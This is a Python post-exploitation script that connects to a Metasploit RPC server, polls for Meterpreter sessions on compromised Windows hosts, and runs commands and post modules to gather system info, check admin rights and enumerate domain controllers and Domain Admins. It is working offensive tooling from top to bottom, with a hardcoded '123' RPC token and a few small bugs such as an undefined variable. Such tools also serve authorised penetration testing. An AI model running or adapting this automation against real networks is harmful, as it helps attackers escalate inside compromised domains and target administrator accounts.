#!/usr/bin/env python3

import re
import os
import sys
import time
import signal
import msfrpc
import asyncio
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError

BUSY_SESSIONS = []

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-p", "--password", default='123', help="Password for msfrpc")
    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
    return parser.parse_args()

# Colored terminal output
def print_bad(msg):
    print((colored('[-] ', 'red') + msg))

def print_info(msg):
    print((colored('[*] ', 'blue') + msg))

def print_good(msg):
    print((colored('[+] ', 'green') + msg))

def print_great(msg):
    print((colored('[!] {}'.format(msg), 'yellow', attrs=['bold'])))

def kill_tasks():
    print()
    print_info('Killing tasks then exiting...')
    for task in asyncio.Task.all_tasks():
        task.cancel()

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

async def get_shell_info(CLIENT, sess_num):
    sysinfo_cmd = 'sysinfo'
    sysinfo_end_str = b'Meterpreter     : '

    sysinfo_output = await run_session_cmd(CLIENT, sess_num, sysinfo_cmd, sysinfo_end_str)
    # Catch error
    if type(sysinfo_output) == str:
        return sysinfo_output

    else:
        sysinfo_utf8_out = sysinfo_output.decode('utf8')
        sysinfo_split = sysinfo_utf8_out.splitlines()

    getuid_cmd = 'getuid'
    getuid_end_str = b'Server username:'

    getuid_output = await run_session_cmd(CLIENT, sess_num, getuid_cmd, getuid_end_str)
    # Catch error
    if type(getuid_output) == str:
        return getuid_output
    else:
        getuid_utf8_out = getuid_output.decode('utf8')
        getuid = 'User            : '+getuid_utf8_out.split('Server username: ')[-1].strip().strip()

    # We won't get here unless there's no errors
    shell_info_list = [getuid] + sysinfo_split

    return shell_info_list

def get_domain(shell_info):
    for l in shell_info:
        l_split = l.split(':')
        if 'Domain      ' in l_split[0]:
            if 'WORKGROUP' in l_split[1]:
                return False
            else:
                domain = l_split[-1].strip()
                return domain

def is_domain_joined(user_info, domain):
    info_split = user_info.split(':')
    dom_and_user = info_split[1].strip()
    dom_and_user_split = dom_and_user.split('\\')
    dom = dom_and_user_split[0]
    user = dom_and_user_split[1]
    if domain:
        if dom.lower() in domain.lower():
            return True

    return False

def print_shell_data(shell_info, admin_shell, local_admin, sess_num_str):
    print_info('New shell info')
    for l in shell_info:
        print('        '+l)
    msg =  '''        Admin shell     : {}
        Local admin     : {}
        Session number  : {}'''.format( 
                              admin_shell.decode('utf8'), 
                              local_admin.decode('utf8'),
                              sess_num_str)
    print(msg)

async def sess_first_check(CLIENT, session, sess_num):
    if b'first_check' not in session:
        print_good('Session {} found, gathering shell info...'.format(str(sess_num)))

        # Give meterpeter chance to open
        await asyncio.sleep(2)

        sess_num_str = str(sess_num)
        session[b'first_check'] = b'False'
        session[b'session_number'] = sess_num_str.encode()

        shell_info = await get_shell_info(CLIENT, sess_num)
        # Catch errors
        if type(shell_info) == str:
            session[b'error'] = shell_info.encode()
            return session

        # returns either a string of the domain name or False
        domain = get_domain(shell_info)
        if domain:
            session[b'domain'] = domain.encode()

        domain_joined = is_domain_joined(shell_info[0], domain)
        if domain_joined == True:
            session[b'domain_joined'] = b'True'
        else:
            session[b'domain_joined'] = b'False'

        admin_shell, local_admin = await is_admin(CLIENT, sess_num)
        # Catch errors
        if type(admin_shell) == str:
            session[b'error'] = admin_shell.encode()
            return session

        session[b'admin_shell'] = admin_shell
        session[b'local_admin'] = local_admin

        print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)

    return session

async def is_admin(CLIENT, sess_num):
    cmd = 'run post/windows/gather/win_privs'

    output = await run_session_cmd(CLIENT, sess_num, cmd, None)
    # Catch error
    if type(output) == str:
        return (output, None)

    if output:
        split_out = output.decode('utf8').splitlines()
        user_info_list = split_out[5].split()
        admin_shell = user_info_list[0]
        system = user_info_list[1]
        local_admin = user_info_list[2]
        user = user_info_list[5]

        # Byte string
        return (str(admin_shell).encode(), str(local_admin).encode())

    else:
        return (b'ERROR', b'ERROR')

async def get_domain_controller(CLIENT, domain_data, sess_num):
    print_info('Getting domain controller...')
    cmd = 'run post/windows/gather/enum_domains'
    end_str = b'[+] Domain Controller:'
    output = await run_session_cmd(CLIENT, sess_num, cmd, end_str)

    # Catch timeout
    if type(output) == str:
        domain_data['err'].append(sess_num)
        return domain_data

    output = output.decode('utf8')
    if 'Domain Controller: ' in output:
        dc = output.split('Domain Controller: ')[-1].strip()
        domain_data['domain_controllers'].append(dc)
        print_good('Domain controller: '+dc)
    else:
        print_bad('No domain controller found')

    return domain_data

async def get_domain_admins(CLIENT, domain_data, sess_num):
    print_info('Getting domain admins...')
    cmd = 'run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"'
    end_str = b'[+] User list'

    output = await run_session_cmd(CLIENT, sess_num, cmd, end_str)
    # Catch timeout
    if type(output) == str:
        domain_data['err'].append(sess_num)
        return domain_data

    output = output.decode('utf8')
    da_line_start = '[*] \t'

    if da_line_start in output:
        split_output = output.splitlines()
        print_info('Domain admins:')

        domain_admins = []
        for l in split_output:
            if l.startswith(da_line_start):
                domain_admin = l.split(da_line_start)[-1].strip()
                domain_admins.append(domain_admin)
                print('        '+domain_admin)
        domain_data['domain_admins'] = domain_admins

    else:
        print_bad('No domain admins found')
        sys.exit()

    return domain_data

async def get_domain_data(CLIENT, session, sess_num, domain_data):
    # Check if we did domain recon yet
    if domain_data['domain_admins'] == []:
        if session[b'domain_joined'] == b'True':
            domain_data = await get_domain_controller(CLIENT, domain_data, sess_num)
            domain_data = await get_domain_admins(CLIENT, domain_data, sess_num)

    return domain_data

async def attack_with_sessions(CLIENT, sessions, domain_data):

    if len(sessions) > 0:

        for s in sessions:

            # Get and print session info if first time we've checked the session
            sessions[s] = await sess_first_check(CLIENT, sessions[s], s)
            
            # Update domain data
            if b'domain' in sessions[s]:
                domain_data['domains'].append(sessions[s][b'domain'])

            if domain_data['domain_admins'] == []:
                domain_data = await get_domain_data(CLIENT, sessions[s], s, domain_data)

    return (sessions, domain_data)

def get_output(CLIENT, cmd, sess_num):
    output = CLIENT.call('session.meterpreter_read', [str(sess_num)])

    # Everythings fine
    if b'data' in output:
        return output[b'data']

    # Got an error from the CLIENT.call
    elif b'error_message' in output:
        decoded_err = output[b'error_message'].decode('utf8')
        print_bad(error_msg.format(sess_num_str, decoded_err))
        return decoded_err

    # Some other error catchall
    else:
        return cmd

def get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs):
    script_errors = [b'[-] post failed', 
                     b'error in script', 
                     b'operation failed', 
                     b'unknown command', 
                     b'operation timed out']

    # Got an error from output
    if any(x in output.lower() for x in script_errors):
        print_bad(('Command [{}] in session {} '
                   'failed with error: {}'
                   ).format(cmd, str(sess_num), output.decode('utf8')))
        return cmd, counter

    # If no terminating string specified just wait til timeout
    if output == b'':
        counter += sleep_secs
        if counter > timeout:
            print_bad('Command [{}] in session {} timed out'.format(cmd, str(sess_num)))
            return 'timed out', counter

    # No output but we haven't reached timeout yet
    return output, counter

async def run_session_cmd(CLIENT, sess_num, cmd, end_str, timeout=30):
    ''' Will only return a str if we failed to run a cmd'''
    global BUSY_SESSIONS

    error_msg = 'Error in session {}: {}'
    sess_num_str = str(sess_num)

    print_info('Running [{}] on session {}'.format(cmd, str(sess_num)))

    while sess_num in BUSY_SESSIONS:
        await asyncio.sleep(.1)

    BUSY_SESSIONS.append(sess_num)

    res = CLIENT.call('session.meterpreter_run_single', [str(sess_num), cmd])

    if b'error_message' in res:
        err_msg = res[b'error_message'].decode('utf8')
        print_bad(error_msg.format(sess_num_str, err_msg))
        return err_msg

    elif res[b'result'] == b'success':

        counter = 0
        sleep_secs = 0.5

        try:
            while True:
                await asyncio.sleep(sleep_secs)

                output = get_output(CLIENT, cmd, sess_num)
                # Error from meterpreter console
                if type(output) == str:
                    BUSY_SESSIONS.remove(sess_num)
                    return output

                # Successfully completed
                if end_str:
                    if end_str in output:
                        BUSY_SESSIONS.remove(sess_num)
                        return output
                # If no end_str specified just return once we have any data
                else:
                    if len(output) > 0:
                        BUSY_SESSIONS.remove(sess_num)
                        return output

                # Check for errors from cmd's output
                output, counter = get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs)
                # Error from cmd output including timeout
                if type(output) == str:
                    BUSY_SESSIONS.remove(sess_num)
                    return output

        # This usually occurs when the session suddenly dies or user quits it
        except Exception as e:
            err = 'exception below likely due to abrupt death of session'
            print_bad(error_msg.format(sess_num_str, err))
            print_bad('    '+str(e))
            BUSY_SESSIONS.remove(sess_num)
            return err

    # b'result' not in res, b'error_message' not in res, just catch everything else as an error
    else:
        print_bad(res[b'result'].decode('utf8'))
        BUSY_SESSIONS.remove(sess_num)
        return cmd
    
def get_perm_token(CLIENT):
    # Authenticate and grab a permanent token
    CLIENT.login(args.username, args.password)
    CLIENT.call('auth.token_add', ['123'])
    CLIENT.token = '123'
    return CLIENT

def filter_broken_sessions(updated_sessions):
    ''' We remove 2 kinds of errored sessions: 1) timed out on sysinfo 2) shell died abruptly '''
    unbroken_sessions = {}

    for s in updated_sessions:
        if b'error' in updated_sessions[s]:
            # Session timed out on initial sysinfo cmd
            if b'domain' not in updated_sessions[s]:
                continue
            # Session abruptly died
            elif updated_sessions[s][b'error'] == b'exception below likely due to abrupt death of session':
                continue

        unbroken_sessions[s] = updated_sessions[s]

    return unbroken_sessions

def update_sessions(sessions, updated_sessions):
    ''' Four keys added after we process a new session: 
        first_check, domain_joined, local_admin, admin_shell 
        This function does not overwrite data from MSF
        it only adds previously known data to the MSF session'''
    if updated_sessions:
        udpated_sessions = filter_broken_sessions(updated_sessions)

        # s = session number, sessions[s] = session data dict
        for s in sessions:
            if s in updated_sessions:
                for k in updated_sessions[s]:
                    if k not in sessions[s]:
                        sessions[s][k] = updated_sessions[s].get(k)

    return sessions

async def check_for_sessions(CLIENT):
    domain_data = {'domains':[], 
                   'domain_controllers':[], 
                   'domain_admins':[], 
                   'err':[]}
    updated_sessions = None
    print_info('Waiting for Meterpreter shell')

    while True:

        # Get list of MSF sessions from RPC server
        sessions = CLIENT.call('session.list')

        # Update the session info dict with previously found information
        sessions = update_sessions(sessions, updated_sessions)

        # Do stuff with the sessions
        updated_sessions, domain_data = await attack_with_sessions(CLIENT, sessions, domain_data)
                
        await asyncio.sleep(10)

def main(args):

    CLIENT = msfrpc.Msfrpc({})
    CLIENT = get_perm_token(CLIENT)

    loop = asyncio.get_event_loop()
    loop.add_signal_handler(signal.SIGINT, kill_tasks)
    task = asyncio.ensure_future(check_for_sessions(CLIENT))
    try:
        loop.run_until_complete(task)
    except asyncio.CancelledError:
        print_info('Tasks gracefully downed a cyanide pill before defecating themselves and collapsing in a twitchy pile')
    finally:
        loop.close()

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root')
        sys.exit()
    main(args)

